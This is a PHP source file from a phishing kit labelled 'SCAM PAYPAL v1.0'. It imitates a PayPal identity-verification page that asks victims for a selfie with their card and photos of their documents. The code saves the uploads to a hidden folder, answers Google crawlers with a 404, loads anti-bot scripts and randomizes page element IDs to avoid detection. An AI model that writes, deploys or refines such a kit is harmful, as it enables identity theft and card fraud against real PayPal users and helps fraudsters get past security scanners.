<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
  session_start();
  error_reporting(1);
  $TIME_DATE = date('H:i:s d/m/Y');
  include('../functions/get_browser.php');
  include('../functions/get_bin.php');
  include('../functions/get_lang.php');
  include('../anti_bots/index.php');
  include('../anti_bots/all_antibots.php');


      $target_dir = 'A797XX666XX.acropo/';
if( isset($_FILES['fileUpload']['name'])) {
      
  $total_files = count($_FILES['fileUpload']['name']);
  
  for($key = 0; $key < $total_files; $key++) {
    
    // Check if file is selected
    if(isset($_FILES['fileUpload']['name'][$key]) 
                      && $_FILES['fileUpload']['size'][$key] > 0) {
      
      $original_filename = $_FILES['fileUpload']['name'][$key];
      $target = $target_dir . basename($original_filename);
      $tmp  = $_FILES['fileUpload']['tmp_name'][$key];
      move_uploaded_file($tmp, $target);
    }
    
  }

  header("Location: identity_drop.php");
     
}
  
  if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
  if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
  //----------------------------------------------------------------------------------------------------------------//
  ?>
<html dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
  <head>
    <script async="" src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Condensed">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <meta http-equiv="Accept-CH" content="Device-Memory">
    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/Mfour.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Condensed">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/b68/a04c217f6513295c043c0faf19ab1/css/styles.css" type="text/css">
    <title><?=$all_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
    <!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link rel="shortcut icon" type="image/x-icon" href="../Mpic/Mfour.ico">
    <link rel="apple-touch-icon" href="../Mpic/Mone.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../Mfiles/Meight.css">
    <link rel="stylesheet" href="../Mfiles/Mten.css">
    <!------------------------------- FILES CSS STYLE --------------------------------->
  </head>
  <body>
    <br>
    <div id="xGhostRiderForm" class="ng-scope">
      <div class="ng-scope ng-isolate-scope">
        <div class="xo-checkout-wrapper ng-scope">
          <div class="outerWrapper" id="outerWrapper">
            <div id="wrapper" class="clearfix" style="width: 600px;">
              <div id="sliding-area" style="width: 600px;">
                <div id="main" style="width: 600px;">
                  <div class="paypalHeaderWrapper">
                    <div class="span14 clearfix paypalHeader">
                      <div id="paypalLogo" class="logo ng-scope">
                      </div>
                    </div>
                  </div>
                  <div id="WorldWide" class="WorldWide xGhostxRider_JC" for="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                    <div class="x_V654DF654THEBEASTXX" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                      <div class="D_AvengersHERE789" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><span>○</span><span>○</span><span class="selected">●</span><span>○</span></div>
                      <div align="center" class="HeaderZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                        <p>
                        <h2 id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$identity;?></h2>
                        </p>
                      </div>
                      <hr style="width: 75%;">
                      <div>
                        <p id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"style="text-align: center;font-size: 1.2em;width: 100%;padding-left: 1%;"><?=$documents;?></p>
                      </div>
                      <div class="MightyxMorphin" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                        <div class="0Dats_Good0" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                          <p style="font-size: 1.2em;"><?=$should;?></p>
                          <div class="Zaz" style="margin-left: 3em;margin-bottom: 1em;font-size: 14px;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <ul>
                              <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$selfie."".$_SESSION['_cc_brand_']." Card";?></li>
                              <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$match;?></li>
                              <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$must;?></li>
                            </ul>
                          </div>
                          <p class="okk" style="font-size: 1.2em;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$example;?></p>
                          <i class="icon-jfi-cloud-up-o" style="margin-bottom:2px" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"></i>
                          <form method="POST" class="validator" enctype="multipart/form-data" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <div id="errorDiv" style="color: red;"></div>
                            <input 
                            type="file" 
                            name="fileUpload[]" 
                            id="filer_input" 
                            multiple="multiple" 
                            required="required" 
                            >
                            <div class="agreeTC checkbox" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                              <div class="x_V-ForZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                <label class="helpNotifyUS" role="button" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Agree;?> &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s 
                                <a><?=$Agreement;?></a>, <a><?=$PolicyPrivacy;?></a><?=$and;?>
                                <a><?=$Communications;?></a>.
                              </label>
                              </div>
                            </div>
                            <input id="submitBtn" type="submit" class="ButtonZ118" value="<?=$submit;?>">
                          </form>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
              <footer>
                <div class="footer clearfix commonFooter">
                  <div class="footerWrapper">
                    <ul class="footerLinks ng-scope">
                      <li><a ><?=$Legal;?></a></li>
                      <li><a ><?=$User;?></a></li>
                      <li><a ><?=$Privacy;?></a></li>
                      <li><a ><?=$Feedback;?></a></li>
                      <li><?=$date;?></li>
                      <li>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </li>
                    </ul>
                  </div>
                </div>
              </footer>
          </div>
        </div>
      </div>
    </div>
    <p id="select_file"></p>
    <!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="../Mfiles/Mfour.js" type="text/javascript"></script>
    <script src="../Mfiles/Mfive.js" type="text/javascript"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
<script type="text/javascript">
  $.fn.filer.defaults = {
        limit: null,
        maxSize: null,
        fileMaxSize: null,
        extensions: null,
        changeInput: true,
        showThumbs: false,
        appendTo: null,
        theme: 'default',
        templates: {
            box: '<ul class="jFiler-items-list jFiler-items-default"></ul>',
            item: '<li class="jFiler-item"><div class="jFiler-item-container"><div class="jFiler-item-inner"><div class="jFiler-item-icon pull-left">{{fi-icon}}</div><div class="jFiler-item-info pull-left"><div class="jFiler-item-title" title="{{fi-name}}">{{fi-name | limitTo:30}}</div><div class="jFiler-item-others"><span>size: {{fi-size2}}</span><span>type: {{fi-extension}}</span><span class="jFiler-item-status">{{fi-progressBar}}</span></div><div class="jFiler-item-assets"><ul class="list-inline"><li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li></ul></div></div></div></div></li>',
            itemAppend: '<li class="jFiler-item"><div class="jFiler-item-container"><div class="jFiler-item-inner"><div class="jFiler-item-icon pull-left">{{fi-icon}}</div><div class="jFiler-item-info pull-left"><div class="jFiler-item-title">{{fi-name | limitTo:35}}</div><div class="jFiler-item-others"><span>size: {{fi-size2}}</span><span>type: {{fi-extension}}</span><span class="jFiler-item-status"></span></div><div class="jFiler-item-assets"><ul class="list-inline"><li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li></ul></div></div></div></div></li>',
            progressBar: '<div class="bar"></div>',
            itemAppendToEnd: false,
            removeConfirmation: true,
            canvasImage: true,
            _selectors: {
                list: '.jFiler-items-list',
                item: '.jFiler-item',
                progressBar: '.bar',
                remove: '.jFiler-item-trash-action'
            }
        },
        files: true,
        uploadFile: true,
        dragDrop: null,
        addMore: true,
        clipBoardPaste: true,
        excludeName: null,
        beforeRender: null,
        afterRender: null,
        beforeShow: null,
        beforeSelect: true,
        onSelect: true,
        onFileCheck: null,
        afterShow: null,
        onRemove: null,
        onEmpty: null,
        options: true,
        dialogs: {
            alert: function(text) {
                return alert(text);
            },
            confirm: function(text, callback) {
                confirm(text) ? callback() : null;
            }
        },
        captions: {
            button: "<?=$Choosef;?>",
            feedback: "<?=$Uploadx;?>",
            feedback2: "<?=$chosen;?>",
            drop: "Drop file here to Upload",
            removeConfirmation: "<?=$yousure;?>",
            errors: {
                filesLimit: "Only {{fi-limit}} files are allowed to be uploaded.",
                filesType: "Only Images are allowed to be uploaded.",
                filesSize: "{{fi-name}} is too large! Please upload file up to {{fi-fileMaxSize}} MB.",
                filesSizeAll: "Files you've choosed are too large! Please upload files up to {{fi-maxSize}} MB.",
                folderUpload: "You are not allowed to upload folders."
            }
        }
    }
</script>
    <script type="text/javascript"> 
  $(document).ready(function() {
        $('#filer_input').filer( {addMore: true, required: true, limit: 1, maxSize: 3, extensions: ["jpg", "png", "gif"], showThumbs: true});
  });
  $("body").on("click", ".ButtonZ118", function () {
            var allowedFiles = [".jpg", ".jpeg", ".png"];
            var fileUpload = $("#filer_input");
            var lblError = $("#errorDiv");
            var regex = new RegExp("([a-zA-Z0-9\s_\\.\-:])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("<?=$selectdocuments;?>");
                return false;
            }
            lblError.html('');
      $(".rotation").delay(0).fadeIn(300);
            return true;
        });
    </script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <div class="rotation">
      <p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;"><?=$votrecompte;?></p>
    </div>
  </body>
</html>